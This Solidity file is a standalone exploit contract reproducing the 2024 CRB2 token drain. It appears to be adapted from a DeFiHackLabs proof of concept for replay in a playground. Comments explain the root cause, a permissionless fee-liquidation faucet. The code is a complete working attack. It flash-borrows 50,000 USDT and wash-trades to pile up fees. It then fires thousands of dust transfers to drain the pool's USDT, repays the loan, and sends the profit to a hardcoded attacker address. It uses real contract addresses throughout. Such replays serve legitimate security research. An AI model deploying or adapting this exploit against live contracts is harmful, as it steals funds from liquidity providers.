// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.15;

// Synthetic standalone exploit for the EVM Playground (2024-06-Crb2).
// The DeFiHackLabs PoC runs the attack INLINE in the Foundry test contract
// (`contract crb2 is Test`) — the PancakeV3 flash callback `pancakeV3FlashCallback`
// lives on the test itself and there is no standalone exploit contract to deploy.
// This contract is a faithful, self-contained copy of that inline attack
// (testExploit + pancakeV3FlashCallback) so the playground can deploy it and record
// run(). Logic and constants are copied verbatim from test/Crb2_exp.sol.
//
// Root cause: CRB2 parks a 5% transfer fee in its OWN contract balance on every
// pair-side trade, and exposes a permissionless "sellToken" faucet reachable by
// simply transferring tokens TO the token contract (`to == address(this)`).
// sellToken() liquidates the CONTRACT'S ENTIRE accumulated CRB2 balance into the
// pool for USDT and pays 95% of the realized USDT to whoever triggered it. The
// attacker flash-borrows USDT, wash-trades through the pool to pile up CRB2 fees
// in the token contract, then fires thousands of dust `transfer(token, dust)`
// calls to repeatedly trip the faucet and harvest the pool's USDT liquidity.

interface IERC20 {
    function balanceOf(address) external view returns (uint256);
    function approve(address, uint256) external returns (bool);
    function transfer(address, uint256) external returns (bool);
    function transferFrom(address, address, uint256) external returns (bool);
}

interface IRouter {
    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;
}

interface IPancakeV3Pool {
    function flash(address recipient, uint256 amount0, uint256 amount1, bytes calldata data) external;
}

contract Crb2Drain {
    // The historical attacker EOA — flash-loan profit is swept here (matches
    // `user` in the Foundry test, which pre-approves the router/attack contract
    // in setUp() and is the ultimate profit receiver).
    address constant USER = 0x65bBA34C11aDd305cB2A1f8A68ceCbd6E75089Cd;

    IRouter constant router = IRouter(0x10ED43C718714eb63d5aA57B78B54704E256024E);
    IERC20 constant crb_token = IERC20(0xee6De822159765daf0Fd72d71529d7ab026ec2f2);
    IERC20 constant busd = IERC20(0x55d398326f99059fF775485246999027B3197955);
    address constant pair = 0x03b051dF794b36E1767cD083fFfDEbbF573eCDA6;
    IPancakeV3Pool constant flashLoan = IPancakeV3Pool(0x46Cf1cF8c69595804ba91dFdd8d6b960c9B0a7C4);

    // step 0: borrow 50,000 USDT from the PancakeV3 flash pool; the callback below
    // does the entire wash-trade + faucet-harvest attack.
    function run() external {
        busd.approve(address(router), type(uint256).max);
        crb_token.approve(address(router), type(uint256).max);

        flashLoan.flash(address(this), 50_000 * 1e18, 0, new bytes(1));
    }

    function pancakeV3FlashCallback(uint256, uint256, bytes calldata) external {
        address[] memory buyPath = new address[](2);
        buyPath[0] = address(busd);
        buyPath[1] = address(crb_token);

        address[] memory sellPath = new address[](2);
        sellPath[0] = address(crb_token);
        sellPath[1] = address(busd);

        // step 1: 70x wash buy/sell round-trips — each leg parks a 5% CRB2 fee
        // in the token contract itself, ballooning its self-held CRB2 balance.
        for (uint256 index = 0; index < 70; index++) {
            router.swapExactTokensForTokensSupportingFeeOnTransferTokens(
                busd.balanceOf(address(pair)) / 10, 0, buyPath, address(this), block.timestamp
            );
            router.swapExactTokensForTokensSupportingFeeOnTransferTokens(
                crb_token.balanceOf(address(this)), 0, sellPath, address(this), block.timestamp
            );
        }

        // step 2: donate USDT to the token so its reward-split bookkeeping doesn't
        // short-circuit the _sellToken realization path.
        busd.transfer(address(crb_token), 2000 * 1e18);

        // step 3: buy CRB2 inventory directly onto the attacker EOA.
        router.swapExactTokensForTokensSupportingFeeOnTransferTokens(
            6_635_861_088_657_488_493_824, 0, buyPath, USER, block.timestamp
        );

        // step 4: compute a dust unit from a small self-buy.
        router.swapExactTokensForTokensSupportingFeeOnTransferTokens(1e18, 0, buyPath, address(this), block.timestamp);
        uint256 amount = crb_token.balanceOf(address(this)) / 10_000;

        // step 5: thousands of dust `transfer(token, dust)` calls. Each one hits
        // CRB2's `to == address(this)` shortcut -> sellToken() -> _swapAndLiquify()
        // dumps the CONTRACT'S ENTIRE accumulated CRB2 into the pool for USDT, and
        // _sellToken() pays 95% of the realized USDT straight to this contract
        // (the caller) -- draining the pool's honest USDT liquidity for free.
        for (uint256 index = 0; index < 100; index++) {
            crb_token.transfer(address(crb_token), amount);
        }

        busd.transfer(address(crb_token), 2000 * 1e18);

        for (uint256 index = 0; index < 250; index++) {
            crb_token.transfer(address(crb_token), amount);
        }

        // step 6: pull the EOA's CRB2/USDT inventory back in and finish liquidating
        // it through the same faucet.
        crb_token.transferFrom(USER, address(this), crb_token.balanceOf(USER) / 2);
        crb_token.transfer(address(crb_token), crb_token.balanceOf(address(this)) - amount * 10_000);
        busd.transferFrom(USER, address(this), busd.balanceOf(USER));

        for (uint256 index = 0; index < 3000; index++) {
            crb_token.transfer(address(crb_token), amount);
        }

        // step 7-8: repay the flash loan (50,000 + 0.05% fee) and sweep the
        // remaining USDT profit to the attacker EOA.
        busd.transfer(address(flashLoan), 50_025 * 1e18);
        busd.transfer(USER, busd.balanceOf(address(this)));
    }
}
